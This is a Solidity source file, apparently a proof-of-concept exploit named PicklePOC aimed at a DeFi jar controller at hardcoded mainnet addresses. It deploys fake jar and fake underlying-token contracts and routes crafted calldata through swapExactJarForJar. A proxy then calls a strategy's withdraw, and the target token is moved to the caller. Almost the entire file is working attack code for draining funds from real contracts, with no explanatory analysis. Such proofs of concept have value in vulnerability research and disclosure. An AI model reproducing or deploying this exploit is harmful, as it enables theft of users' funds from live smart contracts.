pragma solidity >=0.5.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IControllerV4 {
    function swapExactJarForJar(
        address _fromJar, // From which Jar
        address _toJar, // To which Jar
        uint256 _fromJarAmount, // How much jar tokens to swap
        uint256 _toJarMinAmount, // How much jar tokens you'd like at a minimum
        address payable[] calldata _targets,
        bytes[] calldata _data
    ) external returns (uint256) ;
}

contract FromJar {

    function token() external view returns (address) {
        return address(this);
    }

    function getRatio() external view returns (uint256) {
        return 0;
    }

    function decimals() external view returns (uint8) {
        return 0;
    }

    function balanceOf(address owner) external view returns (uint256) {
        return uint256(-1);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        return true;
    }
    function withdraw(uint256 amount) external {}
}

contract toJar {
    address _targetToken;
    address owner;
    uint256 tokenBalance;

    constructor (address _token, uint256 _tokenBalance) public {
        _targetToken = _token;
        owner = tx.origin;
        tokenBalance = _tokenBalance;
    }

    function token() external view returns (address) {
        return _targetToken;
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return true;
    }

    function balanceOf(address owner) external view returns (uint256) {
        return tokenBalance;
    }

    function deposit(uint256 amount) external {
        IERC20(_targetToken).transferFrom(msg.sender, owner, amount);
    }
}

contract Underlying {
    address _targetToken;
    constructor (address _token) public {
        _targetToken = _token;
    }

    function balanceOf(address owner) external view returns (uint256) {
        return uint256(_targetToken);
    }

    function allowance(address owner, address spender) external view returns (uint256){
        return 0;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    }
}

contract PicklePOC {

    function add_liquidity(
        address curve,
        bytes4 curveFunctionSig,
        uint256 curvePoolSize,
        uint256 curveUnderlyingIndex,
        address underlying
    ) public {
    }

    function exploit(address targetStrategy, address targetToken) external {

        uint256 targetToken_balance = IERC20(targetToken).balanceOf(targetStrategy);

        FromJar _fromJar = new FromJar();
        toJar _toJar = new toJar(targetToken, targetToken_balance);
        IControllerV4 v4 = IControllerV4(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);

        // withdraw from strategy
        bytes4 withdrawSig = bytes4(keccak256("withdraw(address)"));

        // CurveProxyLogic Address
        address payable[] memory target = new address payable[](1);
        target[0] = 0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8;

        bytes[] memory data = new bytes[](1);
        // create a fake underlying
        Underlying underlying = new Underlying(targetToken);
        data[0] = abi.encodeWithSelector(this.add_liquidity.selector, targetStrategy, withdrawSig, 1, 0, address(underlying));

        // call swap
        IControllerV4(0x6847259b2B3A4c17e7c43C54409810aF48bA5210).swapExactJarForJar(address(_fromJar), address(_toJar), 0, 0, target, data);

        require(IERC20(targetToken).balanceOf(msg.sender) == targetToken_balance, "something wrong.");
    }
}
